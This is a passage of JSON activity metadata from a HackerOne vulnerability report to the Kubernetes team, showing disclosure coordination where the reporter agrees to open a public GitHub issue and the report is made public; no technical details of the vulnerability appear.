g/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8725945,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"@wiardvanrij Would you like to open a public issue on https://github.com/kubernetes/kubernetes for this? If not, we will follow up with our own issue. Thanks!","automated_response":false,"created_at":"2020-07-23T17:42:02.579Z","updated_at":"2020-07-23T17:42:02.579Z","first_to_agree":true,"actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8730768,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tallclair I'm sorry, I totally missed that. \n\nI will create an issue there. Thanks","automated_response":false,"created_at":"2020-07-23T21:42:29.495Z","updated_at":"2020-07-23T21:42:29.495Z","actor":{"username":"wiardvanrij","cleared":false,"url":"/wiardvanrij","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/498/5839e5b2ceda3f8988eef8d4378fb9cb81f0e97a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8730773,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-07-23T21:42:53.369Z","updated_at":"2020-07-23T21:42:53.369Z","actor":{"username":"wiardvanrij","cleared":false,"url":"/wiardvanrij","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/498/5839e5b2ceda3f8988eef8d4378fb9cb81f0e97a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8730774,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-07-23T21:42:53.425Z","updated_at":"2020-07-23T21:42:53.425Z","actor":{"username":"wiardvanrij","cleared":false,"url":"/wiardvanrij","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/498/5839e5b2ceda3f8988eef8d4378fb9cb81f0e97a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8730869,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"https://github.com/kubernetes/kubernetes/issues/93399\n\nFeel free to give feedback if the issue is not sufficient :) ","automated_response":false,"created_at":"2020-07-23T21:58:46.136Z","updated_at":"2020-07-23T21:58:46.136Z","actor":{"username":"wiardvanrij","cleared":false,"url":"/wiardvanrij","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/498/5839e5b2ceda3f8988eef8d4378fb9cb81f0e97a_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10489583,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2021-01-26T23:04:53.784Z","updated_at":"2021-01-26T23:04:53.784Z","additional_data":{"duplicate_report_id":1087397},"actor":{"username":"pachistano","cleared":false,"url":"/pachistano","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}